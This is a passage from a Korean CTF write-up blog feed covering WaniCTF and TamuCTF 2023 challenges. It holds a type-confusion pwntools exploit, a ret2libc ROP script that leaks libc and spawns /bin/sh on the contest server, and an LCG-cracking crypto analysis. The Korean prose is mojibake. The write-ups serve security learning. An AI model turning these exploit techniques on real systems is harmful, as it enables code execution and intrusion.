class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;id :&#x27;</span>, <span class="string">&#x27;2000&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;major :&#x27;</span>, <span class="string">&#x27;100&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># mandatory_subject</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># elective_subject</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># elective_subjectë¥¼ mandatory_subjectë¡œ í—·ê°ˆë¦¬ê²Œ í•´ì„œ </span></span><br><span class="line"><span class="comment"># mandatory_subjectì˜ memo[32]ì— ì ëŠ” ì¤„ ì•Œê³ </span></span><br><span class="line"><span class="comment"># elective_subjectì˜ memo[32]ì— ì ì„ ê²ƒ ê°™ìŒ</span></span><br><span class="line"><span class="comment"># payload = p64(e.got[&#x27;printf&#x27;])  </span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span> <span class="comment"># &#x27;b&#x27;*8ì´ í•¨ìˆ˜í¬ì¸í„°ì— ë“¤ì–´ê°</span></span><br><span class="line">write_memo(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">see_class()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">libc_leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) </span><br><span class="line"><span class="comment"># libc.address = libc_leak - libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]</span></span><br><span class="line">info(<span class="built_in">hex</span>(libc_leak))</span><br><span class="line"><span class="comment"># info(hex(libc.address))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># func pointer -&gt; system .. </span></span><br><span class="line"><span class="comment"># payload = b&#x27;a&#x27;*8</span></span><br><span class="line"><span class="comment"># system = libc.address + libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line">system = libc_leak -<span class="number">0x1c9a20</span></span><br><span class="line"></span><br><span class="line">payload = p64(system) * <span class="number">2</span></span><br><span class="line">write_memo(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># register_elective_class</span></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;Do_n0t_confus3_mandatory_and_el3ctive&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Wani </category>
          
      </categories>
      
      
        <tags>
            
            <tag> type confusion </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wani CTF 2023 review</title>
      <link href="/230509-wanictf2023-0review/"/>
      <url>/230509-wanictf2023-0review/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1988">https://ctftime.org/event/1988</a></li></ul><p>ëª©ìš”ì¼ ì €ë…ì— ctftimeì— ë“¤ì–´ê°”ëŠ”ë° ìœ„ ì”¨í…ì´ ì§„í–‰ì¤‘ì´ì—ˆë‹¤. </p><img src="/images/230509-wanictf2023-0review/pwnable.png" width=700/><br><p>ìž ê¹ ì°¸ì—¬í–ˆëŠ”ë° 7ë²ˆê¹Œì§€ëŠ” ìˆ ìˆ  í’€ë ¸ë‹¤. 8ë²ˆ ë¬¸ì œì—ì„œ type confusion ì¼ìœ¼ì¼œì„œ ì›í•˜ëŠ” í•¨ìˆ˜ë¥¼ ì‹¤í–‰ì‹œí‚¤ëŠ” ê²ƒê¹Œì§€ ì½”ë“œ ìž‘ì„±í•˜ëŠ” ê²ƒì„ ì„±ê³µí–ˆë‹¤. ê·¼ë° libc addressë¥¼ leakí•´ì•¼í•˜ëŠ” ê²Œ ë– ì˜¬ë¼ì„œ printí•˜ëŠ” ë¶€ë¶„ì„ ì°¾ì•„ë´¤ê³ , ë¨¸ë¦¿ì†ìœ¼ë¡œ ì´ë ‡ê²Œ ì´ë ‡ê²Œ í•˜ë©´ ë  ê²ƒ ê°™ì€ë°.. ê¹Œì§€ ìƒê°í–ˆëŠ”ë°,.. ì§‘ì¤‘ì´ ìž˜ ì•ˆë˜ì–´ì„œ ìž¤ë‹¤. ê·¸ë¦¬ê³  ê¸ˆìš”ì¼ì— ì´ì–´ì„œ ë¬¸ì œ í’€ë ¤ê³  í–ˆëŠ”ë° ê°œì¸ì ìœ¼ë¡œ ìŠ¤íŠ¸ë ˆìŠ¤ ë°›ëŠ” ì¼ì´ ìžˆì–´ ì»´í“¨í„°ê°€ ì†ì— ìž˜ ì•ˆìž¡í˜€ì„œ ê²°êµ­ ëŒ€íšŒì‹œê°„ ë‚´ì— í’€ì§€ ëª»í–ˆë‹¤. 9ë²ˆ ë¬¸ì œëŠ” ì–¼í•ë³´ë‹ˆ heapì´ë¼ì„œ ë³´ì§€ ì•Šì•˜ë‹¤. </p><p>ìš”ì¦˜ ì”¨í…ì— ìžì£¼ ì°¸ì—¬í•˜ë‹¤ ë³´ë‹ˆ ë‚´ê°€ ìž˜ ì•„ëŠ” ê²ƒë“¤ì— ëŒ€í•´ ë¡¸ì—…ì„ ìž‘ì„±í•´ì•¼í• ê¹Œ? ë¼ëŠ” í•„ìš”ì„±ì„ ëŠê¼ˆë‹¤. ë¸”ë¡œê·¸ í•˜ëŠ” ë°ì— í”¼ë¡œê°ì„ ëŠë¼ê³  ì‹¶ì§€ ì•Šì€ë° ë¡¸ì—…ì„ ì ì–´ì•¼ í•  ë¬¸ì œë“¤ì´ ë§Žìœ¼ë©´ ì¡°ê¸ˆì”© ë¯¸ë£¨ê²Œ ëœë‹¤. angstrom ì”¨í… ë¡¸ì—… ì ê³ ë‚˜ì„œ ë‚´ ë¸”ë¡œê·¸ ë¡¸ì—…ì„ ë³´ê³  ì¹œêµ¬ì™€ í•¨ê»˜ ì‹œìŠ¤í…œ í•´í‚¹ ì‹œìž‘í•˜ê¸°ë¡œ í–ˆë‹¤ëŠ” ì—°ë½ì„ ë””ìŠ¤ì½”ë“œë¡œ ë°›ì•˜ì„ ë• ê¸°ë»ì„œ ì•žìœ¼ë¡œë„ ì‰¬ìš´ ë¬¸ì œë„ ë¡¸ì—…ì„ ì—´ì‹¬ížˆ ì ê² ë‹¤ê³  ì†ìœ¼ë¡œ ë‹¤ì§í–ˆëŠ”ë°,.. ã…‹ã…‹^^; ë¬¼ë¡  ì²´ë ¥ê³¼ ì‹œê°„ì´ ë§Žë‹¤ë©´ ê·¸ëŸ¬ê² ì§€ë§Œ ìš”ì¦˜ ì¡°ê¸ˆ í”¼ê³¤í•˜ê¸°ë„ í•´ì„œ ì´ ì”¨í…ì€ 7ë²ˆê¹Œì§€ëŠ” ë¡¸ì—…ì„ ì ì§€ ì•Šê³  8ë²ˆë§Œ ì ìœ¼ë ¤ê³  í•œë‹¤. (1ë²ˆë¶€í„° 7ë²ˆê¹Œì§€ ë¬¸ì œ ì´ë¦„ì´ ê³§ ìµìŠ¤í”Œë¡œìž‡ì´ë‹¤.)</p><br><img src="/images/230509-wanictf2023-0review/crypto.png" width=700/><br><p>ì”¨í… ì»¨ì…‰ì´ beginner, ì´ˆì‹¬ìž í˜¹ì€ ì¤‘ê¸‰ìžê¹Œì§€ ëª¨ë‘ë¥¼ ì•„ìš°ë¥´ëŠ” ë‚œì´ë„ë¥¼ ê°€ì§€ê³  ìžˆì–´ì„œ ì •ë§ ê¸°ë³¸ì ì¸ í¬ë„ˆë¸” ë¬¸ì œ ë§Œí¼ í¬ë¦½í† ë„ ê·¸ëŸ´ ê²ƒì´ë¼ê³  ìƒê°ëœë‹¤. ë‚´ ë§ˆìŒì†ì˜ í¬ë¦½í† ì— ëŒ€í•œ ì‚¬ëž‘ì´ ì¡°ê¸ˆ ì‹¹ë‚¬ê¸° ë•Œë¬¸ì—.. ë°€ë¦° ë¡¸ì—…ë“¤ì„ ì˜¬ë¦¬ê³  í’€ì–´ë´ë„ ì¢‹ì„ ë“¯ í•˜ë‹¤.</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Wani </category>
          
      </categories>
      
      
        <tags>
            
            <tag> review </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tamu CTF 2023 - Inspector Gadget (pwn, rop)</title>
      <link href="/230503-tamu2023-1.Inspector_Gadget-pwn/"/>
      <url>/230503-tamu2023-1.Inspector_Gadget-pwn/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1914">https://ctftime.org/event/1914</a></li></ul><blockquote><p>Inspector Gadget gave me this binary with one goal. pwn.<br>Author: <code>_mac_</code></p></blockquote><ul><li>[128 solves &#x2F; 339 points]</li></ul><img src="/images/230503-tamu2023-1.Inspector_Gadget-pwn/Screenshot 2023-05-03 at 17.31.43.png" width=500/><br><p>ì•„ì‹¸! ë‚´ê°€ í¼ë¸”í–ˆë‹¤!!</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>ë¬¸ì œ ë°”ì´ë„ˆë¦¬ì™€ ë¦½ì‹œ íŒŒì¼ì„ ì œê³µë°›ì•˜ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] </span></span><br><span class="line"></span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x60</span>uLL);</span><br></pre></td></tr></table></figure><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>64bit ROPì˜ ì •ì„ ì¤‘ì— ì •ì„ì´ë¼ê³  ìƒê°í•œë‹¤.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;inspector-gadget&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./inspector-gadget&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./inspector-gadget&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x40127b</span></span><br><span class="line">ret = <span class="number">0x401016</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x10</span> + <span class="number">0x8</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(e.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x10</span>+<span class="number">0x8</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">payload += p64(ret) <span class="comment"># ret</span></span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gigem&#123;ret2libc_r0p_g04t3d&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Tamu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tamu CTF 2023 - PRNG (crypto, lcg)</title>
      <link href="/230503-tamu2023-10.PRNG-crypto/"/>
      <url>/230503-tamu2023-10.PRNG-crypto/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1914">https://ctftime.org/event/1914</a></li></ul><blockquote><p>I know they say donâ€™t roll your own crypto, but secure RNG should be easy. How hard could it be?<br>Author: anomie</p></blockquote><ul><li>[78 solves &#x2F; 441 points]</li></ul><p>ì´ ë¬¸ì œ í‘¸ëŠ”ë° ê°€ìž¥ ì˜¤ëž˜ ê±¸ë¦° ê²ƒ ê°™ë‹¤.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag, m, a, c</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Rand</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed</span>):</span><br><span class="line">        self.m = m</span><br><span class="line">        self.a = a</span><br><span class="line">        self.c = c</span><br><span class="line">        self.seed = seed</span><br><span class="line">        <span class="keyword">if</span> seed % <span class="number">2</span> == <span class="number">0</span>: <span class="comment"># initial state must be odd</span></span><br><span class="line">            self.seed += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rand</span>(<span class="params">self</span>):</span><br><span class="line">        self.seed = (self.a * self.seed + self.c) % self.m</span><br><span class="line">        <span class="keyword">return</span> self.seed</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    seed = secrets.choice(<span class="built_in">range</span>(<span class="number">0</span>, <span class="number">0x7fffffffffffffff</span>))</span><br><span class="line">    rng = Rand(seed)</span><br><span class="line">    </span><br><span class="line">    chall = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        chall.append(rng.rand())</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Authenticate. Provide the next 10 numbers following&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> chall:</span><br><span class="line">        <span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        x = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> x != rng.rand():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Access denied.&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Access granted.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><code>seed = secrets.choice(range(0, 0x7fffffffffffffff))</code>ì´ëŸ° ì‹ìœ¼ë¡œ <code>seed</code>ë¥¼ ëžœë¤ìœ¼ë¡œ ë§Œë“¤ê³ , <code>Rand</code> í´ëž˜ìŠ¤ ê°ì²´ë¥¼ ë§Œë“ ë‹¤. ê·¸ë¦¬ê³  <code>rng.rand()</code>í•œ ê°’ 10ê°œë¥¼ ì¶œë ¥í•´ì£¼ëŠ”ë° ì´ê²ƒì„ ë°”íƒ•ìœ¼ë¡œ ë‹¤ìŒ <code>rng.rand()</code>ë¥¼ 10ë²ˆ ì—°ì†ìœ¼ë¡œ ë§žì¶°ì•¼ <code>flag</code>ë¥¼ ì¶œë ¥í•´ì¤€ë‹¤. ë¬¸ì œëŠ” <code>rng.rand()</code>ê°€ ì•„ëž˜ê°™ì´ êµ¬í˜„ë˜ì–´ ìžˆì–´ì„œ ë¬¸ì œì—ì„œ ì¶œë ¥í•´ì¤€ <code>rng.rand()</code> ê°’ì„ ë°”íƒ•ìœ¼ë¡œ ë‹¤ìŒ <code>rng.rand()</code> ê°’ì„ êµ¬í•  ìˆ˜ ìžˆì„ ê²ƒ ê°™ì€ ê¸°ë¶„ì´ë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rand</span>(<span class="params">self</span>):</span><br><span class="line">    self.seed = (self.a * self.seed + self.c) % self.m</span><br><span class="line">    <span class="keyword">return</span> self.seed</span><br></pre></td></tr></table></figure><p><code>m</code>, <code>a</code>, <code>c</code>ê°€ ê³ ì •ë˜ì–´ ìžˆì–´ì„œ ë°©ì •ì‹ì„ ì´ìš©í•´ì„œ êµ¬í•  ìˆ˜ ìžˆì„ ê²ƒ ê°™ë‹¤!</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(a * seed[i] + c) % m == seed[i+1]</span><br></pre></td></tr></table></figure><p>ì°¸ê³ ë¡œ ì´ê±¸ <code>LCG ì•Œê³ ë¦¬ì¦˜</code>ì´ë¼ê³  í•˜ëŠ”ë° ìœ„ì˜ ì‹ì— ë”°ë¼ ë‚œìˆ˜ê°€ ìƒì„±ë˜ëŠ” ì•Œê³ ë¦¬ì¦˜ì´ë‹¤. ì´ ì•Œê³ ë¦¬ì¦˜ì€ ë³€ìˆ˜ë¥¼ í†µí•´ ë‚œìˆ˜ë¥¼ ìƒì„±í•˜ê¸° ë•Œë¬¸ì— ë³€ìˆ˜ë¥¼ ì•Œë©´ ë‚œìˆ˜ë¥¼ ì˜ˆì¸¡í•  ìˆ˜ ìžˆë‹¤ëŠ” ì·¨ì•½í•œ ì„±ì§ˆì„ ê°€ì§€ê³  ìžˆë‹¤. ì—¬ê¸°ì„œ <code>m</code>, <code>a</code>, <code>c</code>ë¥¼ êµ¬í•´ì•¼í•œë‹¤ëŠ” í™•ì‹ ì„ ê°€ì¡Œë‹¤.</p><h2 id="z3"><a href="#z3" class="headerlink" title="z3"></a>z3</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">seed = [<span class="number">15292707418901107848</span>, <span class="number">3732399702731999469</span>, <span class="number">17727906530283792422</span>, <span class="number">5740441724751270531</span>, <span class="number">8708853459937082772</span>, <span class="number">10615078376953059625</span>, <span class="number">13017389135088601170</span>, <span class="number">12756134783055003231</span>, <span class="number">13176328566446297056</span>, <span class="number">5276211473026467749</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># a = BitVec(&#x27;a&#x27;, 64)</span></span><br><span class="line"><span class="comment"># c = BitVec(&#x27;c&#x27;, 64)</span></span><br><span class="line"><span class="comment"># m = BitVec(&#x27;m&#x27;, 64)</span></span><br><span class="line">a = Int(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">c = Int(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">m = Int(<span class="string">&#x27;m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(m &gt; <span class="number">0</span>)</span><br><span class="line">s.add(a &gt; <span class="number">0</span>)</span><br><span class="line">s.add(c &gt;= <span class="number">0</span>)</span><br><span class="line">s.add(m &gt; a)</span><br><span class="line">s.add(m &gt; c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    <span class="comment"># s.add((a * seed[i] + c) % m == seed[i+1])</span></span><br><span class="line">    s.add( ((a%m * seed[i]%m + c%m) % m) == seed[i+<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(s.check())</span><br><span class="line">    <span class="comment"># print(s.model())</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s.check())</span><br><span class="line"><span class="built_in">print</span>(s.model())</span><br></pre></td></tr></table></figure><p>ì²˜ìŒì—ëŠ” ì´ëŸ°ì‹ìœ¼ë¡œ z3ë¥¼ ì´ìš©í•´ì„œ ë¬¸ì œë¥¼ í’€ê³  ì‹¶ì—ˆë‹¤. í•˜ì§€ë§Œ ì†ë„ê°€ ë„ˆë¬´ ì˜¤ëž˜ ê±¸ë ¸ë‹¤. <code>m</code>, <code>a</code>, <code>c</code>ë¥¼ êµ¬í•˜ëŠ”ë° í•˜ë£¨ì¢…ì¼ ê±¸ë¦´ ê²ƒ ê°™ì•„ì„œ ëŒë ¤ë†“ê³  ë‹¤ë¥¸ ë°©ë²•ì„ ì°¾ê¸°ë¡œ í–ˆë‹¤.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>ê²°êµ­ ì•„ëž˜ ë¡¸ì—… ì°¸ê³ í•´ì„œ <code>m</code>, <code>a</code>, <code>c</code>ë¥¼ êµ¬í•˜ëŠ” ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì°¾ì•˜ê³  ê·¸ëŒ€ë¡œ ì´ìš©í–ˆë‹¤!.</p><ul><li><a href="https://ctftime.org/writeup/12046">https://ctftime.org/writeup/12046</a></li></ul><h3 id="Solved-Code"><a href="#Solved-Code" class="headerlink" title="Solved Code"></a>Solved Code</h3><ul><li><code>lcg_cracker.py</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span 